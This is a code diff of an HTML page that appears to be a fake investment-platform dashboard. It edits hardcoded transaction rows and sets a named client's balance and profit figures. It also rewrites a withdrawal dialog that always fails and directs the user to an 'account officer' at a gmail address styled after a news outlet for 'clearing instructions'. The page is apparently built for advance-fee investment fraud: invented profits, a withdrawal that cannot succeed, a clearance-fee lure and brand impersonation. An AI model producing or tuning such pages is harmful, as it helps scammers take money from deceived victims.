@@ -117,14 +117,14 @@
                 <div class="overflow-x-auto">
                     <table class="w-full text-left">
                         <thead class="bg-gray-50 text-xs font-bold text-gray-500 uppercase">
-                            <tr>
+                            <!-- <tr>
                                 <th class="px-6 py-4">Transaction Date</th>
                                 <th class="px-6 py-4">Description</th>
                                 <th class="px-6 py-4">Amount</th>
                                 <th class="px-6 py-4">Status</th>
                             </tr>
                         </thead>
-                        <!-- <tbody class="divide-y divide-gray-100 text-sm">
+                        <tbody class="divide-y divide-gray-100 text-sm">
                             <tr>
                                 <td class="px-6 py-4">Feb 20, 2026</td>
                                 <td class="px-6 py-4 font-medium">Clearance Fee</td>
@@ -142,32 +142,32 @@
                                 <td class="px-6 py-4 font-medium">Investment Profit</td>
                                 <td class="px-6 py-4 text-green-600 font-bold">+$8,519.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
-                            </tr>
+                            </tr> -->
                              <tr>
-                                <td class="px-6 py-4">Jan 30, 2026</td>
+                                <td class="px-6 py-4">Sep 4, 2026</td>
                                 <td class="px-6 py-4 font-medium">Investment Profit</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$22,304.00</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$1250.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
                             </tr>
                              <tr>
-                                <td class="px-6 py-4">Jan 23, 2026</td>
+                                <td class="px-6 py-4">Sep 3, 2026</td>
                                 <td class="px-6 py-4 font-medium">Investment Profit</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$6,782.00</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$125.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
                             </tr>
                              <tr>
-                                <td class="px-6 py-4">Jan 15, 2026</td>
-                                <td class="px-6 py-4 font-medium">Investment Profit</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$13,579.00</td>
+                                <td class="px-6 py-4">Sep 3, 2026</td>
+                                <td class="px-6 py-4 font-large">VIP  Welcome Bonus</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$250.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
                             </tr>
                              <tr>
-                                <td class="px-6 py-4">Jan 5, 2026</td>
+                                <td class="px-6 py-4">Sep 3, 2026</td>
                                 <td class="px-6 py-4 font-medium">Investment Deposit</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$20,000.00</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$250.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
                             </tr>
-                        </tbody> -->
+                        </tbody>
                     </table>
                 </div>
             </div>
@@ -193,9 +193,9 @@
     <script>
         const clientData = {
             name: "Shane Stener",
-            invested: "$0.00",
-            profit: "$0.00",
-            balance: "$0.00",
+            invested: "$250.00",
+            profit: "$500.00",
+            balance: "$750.00",
             officer: "Jenny Williams",
             email: "foxnewsinvestment.co@gmail.com"
         };
@@ -230,7 +230,7 @@
         });
 
         function openWithdrawModal() {
-            const errorText = `Withdrawal failed. Insufficient Balance. Please contact your account officer, ${clientData.officer}, at ${clientData.email} for clearing instructions.`;
+            const errorText = `Withdrawal Failed. Investment In Progress. In case of Emergency Withdrawal Please contact your account officer, ${clientData.officer}, at ${clientData.email} for clearing instructions.`;
             document.getElementById('modal-text').innerText = errorText;
             document.getElementById('contact-btn').onclick = () => {
                 window.location.href = `mailto:${clientData.email}?subject=Withdrawal Inquiry - ${clientData.name}`;
